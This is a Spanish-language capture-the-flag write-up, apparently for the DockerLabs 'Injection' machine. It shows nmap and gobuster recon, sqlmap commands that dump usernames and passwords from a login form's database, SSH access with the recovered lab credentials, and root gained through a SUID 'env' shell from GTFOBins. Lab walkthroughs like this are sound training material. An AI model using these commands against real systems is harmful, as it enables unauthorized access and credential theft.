# 🐧Máquina Injection

![injection.jpg](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/injection.jpg)

**Índice**

# Requisitos previos.

---

### 💿 Instalar Docker.

Para utilizar las máquinas de DockerLabs, hay que instalar Docker en el sistema operativo.

Agrega más detalles aquí…

```bash
sudo apt install docker.io
```

![instalarDocker.jpeg](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/instalarDocker.jpeg)

### 🖥️ Desplegar máquinas vulnerables.

Al descomprimir el archivo.tar obtenemos dos archivos: 

- auto_deploy.sh
- maquinaVulnerable.tar

```bash
sudo bash auto_deploy.sh maquinaVulnerable.tar
```

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/4ea1c794-cb4f-442d-bdee-49902a27a101.png)

### 🚮 Eliminar máquinas vulnerables.

Al finalizar, eliminamos el laboratorio con la combinación de teclas: “Ctrl + c”

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/326748d7-855e-4464-b984-9c24497538ac.png)

# Reconocimiento

---

### 🕵‍♂️Verifico accesibilidad con el comando ping.

El comando “**ping -c 1**” enviando un solo paquete al host de destino.

```bash
ping -c 1 172.17.0.2
```

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/6d779b3d-db19-48d4-bbfb-f47f47738759.png)

La **ttl = 64** nos indica que se trata de una máquina Linux.

### 🕵‍♂️Escaneo de puertos.

Con la herramienta **nmap realizo un escaneo:**

```bash
sudo nmap -p- --open -sS -sC -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN scanInjection
```

- -p- ➡️  Busco todos los puertos abiertos dentro de una IP.
- —open ➡️ Escaneo de puertos abiertos.
- -sS ➡️ Escaneo de tipo SYN. Identifica puertos abiertos en un host sin completar la conexión TCP. Realiza un escaneo menos detectable y más rápido.
- -sC ➡️ Conjunto de scripts de reconocimiento para realizar este escaneo dentro de los puertos abiertos.
- -sV ➡️ Dentro de los puertos abiertos, encuentra la versión que esta corriendo.
- —min-rate=5000 ➡️ Velocidad mínima de envió de paquetes durante un escaneo. En este caso se enviarán paquetes a una velocidad no menor de 5000 paquetes por segundo. Se recomienda un —min-rate=2000.
- -n ➡️ evita resolución DNS.
- -Pn ➡️ No realiza ping.
- -vvv ➡️ reporta a medida que obtiene resultados.
- -oN ➡️ guarda el escaneo dentro de un fichero.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/342a4341-76e2-4c42-931e-c157424b333b.png)

# Explotación

---

### 🕵🏼‍♂️ Puerto 80

Ingresamos y observamos que hay un panel de Login. Busco información relevante en el código HTML con la combinación de teclas “ctrl + u” pero no encuentro nada importante.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/Untitled.png)

Trato de encontrar subdirectorios, archivos relevantes realizando **fuzzing  web** con la herramienta **gobuster*.***

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html
```

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/8bc67b0f-ca6c-4c6b-a872-f993779d8d09.png)

No encuentro ningún archivo ni subdirectorio importante. Como estoy en un panel de Login, intentaré realizar la intrusión mediante una inyección SQL.

### 🕵🏼‍♂️ Inyección SQL.

La inyección SQL la puedo hacer de manera manual o usando la herramienta **sqlmap.**

```bash
sqlmap -u http://172.17.0.2/ --forms --dbs --batch
```

- —forms ➡️ Este parámetro busca y prueba formularios HTML en la página web. Esto es útil para identificar y explotar vulnerabilidades SQL en formularios de entrada de datos.
- —dbs ➡️ Este parámetro enumera todas las bases de datos disponibles en el servidor de la base de datos una vez que se haya identificado una vulnerabilidad de inyección SQL.
- —batch ➡️ Este parámetro permite ejecutar en modo automático y sin necesidad de intervención del usuario. Es útil para automatizar el proceso de prueba y explotación, especialmente en entornos controlados donde se sabe que la máquina es vulnerable.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/fef2f77c-2213-484c-bd59-9c089a925264.png)

De todas estas bases de datos, voy a buscar usuarios y contraseñas, en la base de datos, “register”

```bash
sqlmap -u http://172.17.0.2/ --forms -D register --tables --batch
```

- -D ➡️ Indica que base de datos debe atacar.
- —tables ➡️ Enumera todas las tablas de la base de datos.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/f0fc9586-fe8c-400b-bd01-04adb312bee2.png)

Encuentro la tabla “users”. Voy a buscar las columnas que tiene dicha tabla.

```bash
sqlmap -u http://172.17.0.2/ --forms -D register -T users --columns --batch
```

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/e92d0472-9188-4468-88c8-8fb5e255d508.png)

Por último, listo las filas y columnas.

```bash
sqlmap -u http://172.17.0.2/ --forms -D register -T users -C passwd,username --dump --batch 
```

- -C ➡️ Especifica las columnas de las que quiero extraer información. En este caso, passwd y username.
- —dump ➡️ Extrae y muestra el contenido de las columnas especificadas.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/2af52508-2637-43e2-92c2-992090afca8e.png)

Finalizando la inyección SQL obtengo:

<aside>
💡 usuario: dylan
contraseña: KJSDFG789FGSDF78

</aside>

# Intrusión

---

### 🔓Accediendo al sistema.

Al obtener usuario y contraseña, ingreso por el puerto 22, protocolo SSH.

```bash
ssh dylan@172.17.0.2
```

Con el comando ***whoami*** verifico quién soy para ver si tengo acceso o no, como usuario root.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/da11aaea-4cff-45c1-b665-661a6c14cfc7.png)

### 🔓Escalada de privilegios.

Una vez hayamos obtenido acceso remoto al servidor, es necesario proceder con la escalada de privilegios, para poder convertirnos en el usuario root del sistema y así contar con todo tipo de permisos sobre el mismo.

Con el comando ***sudo -l*** voy a comprobar posibles formas de escalar privilegios.

```bash
dylan@1d20c3dbed74:~$ sudo -l
```

Intento con otro comando:

```bash
find / -perm -4000 2>/dev/null
```

Este comando sirve para buscar binarios con permiso de root, dentro del sistema.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/8ce02321-eb9c-407c-8cfe-9c085f61a98f.png)

En [https://gtfobins.github.io/](https://gtfobins.github.io/) puedo ver instrucciones para poder escalar privilegios utilizando binarios. De entre esas opciones, lo mejor es ir probando cuales puedo utilizar. En particular voy a  buscar /env.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/23877e9e-ba5c-42b6-b751-97cc314c8790.png)

```bash
/usr/bin/env /bin/sh -p
```

Es importante recordar, de escribir la ubicación absoluta. En gtfobins, el "." me indica que es una ubicación relativa.
Luego de ejecutar, obtengo acceso root.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Injection%203cdabe8c114d4771b8dfd1565e37c924/3c8b4643-783e-47b0-bf5e-bac5cce62e55.png)

---